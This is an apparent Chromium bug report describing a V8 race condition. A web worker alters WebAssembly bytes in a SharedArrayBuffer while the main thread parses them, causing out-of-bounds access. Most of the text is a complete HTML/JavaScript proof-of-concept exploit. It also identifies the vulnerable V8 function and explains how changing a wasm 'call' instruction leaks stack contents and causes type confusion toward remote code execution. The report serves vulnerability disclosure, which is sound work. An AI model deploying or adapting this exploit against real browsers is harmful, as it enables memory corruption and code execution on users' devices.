From https://b.corp.google.com/issues/64796825
Part of chrome remote exploit for pixel.

1. The RCE Bug
By combining the three fetures(WebAssembly, Web worker and SharedArrayBuffer) in chrome, an OOB access can be triggered through race condition. Simply speaking, WebAssembly code can be put into a SharedArrayBuffer, and then transfer to a webworker. When the main thread parses the WebAssembly Code, the worker thread can modify the code at the same time, which cause an OOB access, a short PoC is as follows:

<html>
<h1>poc</h1>
<script id="worker1">
worker:{
    if (typeof window === 'object') break worker; // Bail if we're not a Worker
    self.onmessage = function(arg) {
        //%DebugPrint(arg.data);
        console.log("worker started");
        var ta = new Uint8Array(arg.data);
        //%DebugPrint(ta.buffer);
        var i =0;
        while(1){
            if(i==0){
                i=1;
                ta[51]=0;                               //--------------------->4)modify the webassembly code at the same time
            }else{
                i=0;
                ta[51]=128;
            }
        }
    }
}
</script>

<script>
function getSharedTypedArray(){
    var wasmarr = [
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
        0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,
        0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,
        0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,
        0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,
        0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b
            ];
    var sb = new SharedArrayBuffer(wasmarr.length);           //------------------> 1)put WebAssembly code in a SharedArrayBuffer
    var sta = new Uint8Array(sb);
    for(var i=0;i<sta.length;i++)
        sta[i]=wasmarr[i];
    return sta;    
}
var blob = new Blob([
        document.querySelector('#worker1').textContent
        ], { type: "text/javascript" })

var worker = new Worker(window.URL.createObjectURL(blob));   //-------------------->2)create a web worker
var sta = getSharedTypedArray();
//%DebugPrint(sta.buffer);
worker.postMessage(sta.buffer);                              //-------------------->3)pass the WebAssembly code to the web worker


setTimeout(function(){
        while(1){
        try{
        //console.log(sta[50]);
        sta[51]=0;
        var myModule = new WebAssembly.Module(sta);          //--------------------->4)parse the webassembly code
        var myInstance = new WebAssembly.Instance(myModule);
        //myInstance.exports.getAnswerPlus1();
        }catch(e){
        ///console.log(e)
        }
        }
    },1000);

//worker.terminate(); 
</script>
</html>

I think the buggy code is in the following function
https://chromium.googlesource.com/v8/v8.git/+/07259a9ceafa078c9bb7f9ee1bb6f2d67256cc80/src/wasm/wasm-js.cc#69
i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(
    const v8::FunctionCallbackInfo<v8::Value>& args, ErrorThrower* thrower) {
  ......
  } else if (source->IsTypedArray()) {    ------------------->source should be checked if it's backed by a SharedArrayBuffer
    // A TypedArray was passed.
    Local<TypedArray> array = Local<TypedArray>::Cast(source);
    Local<ArrayBuffer> buffer = array->Buffer();
    ArrayBuffer::Contents contents = buffer->GetContents();
    start =
        reinterpret_cast<const byte*>(contents.Data()) + array->ByteOffset();
    length = array->ByteLength();
  } 
  ......
  return i::wasm::ModuleWireBytes(start, start + length);
}

The exploit of this bug is easy, we can simply modify "call xxx" webassembly instruction to leak stack contents and  cause type confusion, 
for example, we can dump the aforementioned webassembly code by wasm-objdump.
ggong@ggong-pc:~$ wasm-objdump -d test.wasm




test.wasm:      file format wasm 0x1

Code Disassembly:

00002b func[0]:
 00002d: 41 2a                      | i32.const 42
 00002f: 0b                         | end
000030 func[1]:
 000032: 10 00                      | call 0                  -------------> the aforementioned worker thread modified this call intstructrion to call 128 and cause a OOB access 
 000034: 41 01                      | i32.const 1
 000036: 6a                         | i32.add
 000037: 0b                         | end
As to the detail, please refer to the full exploit.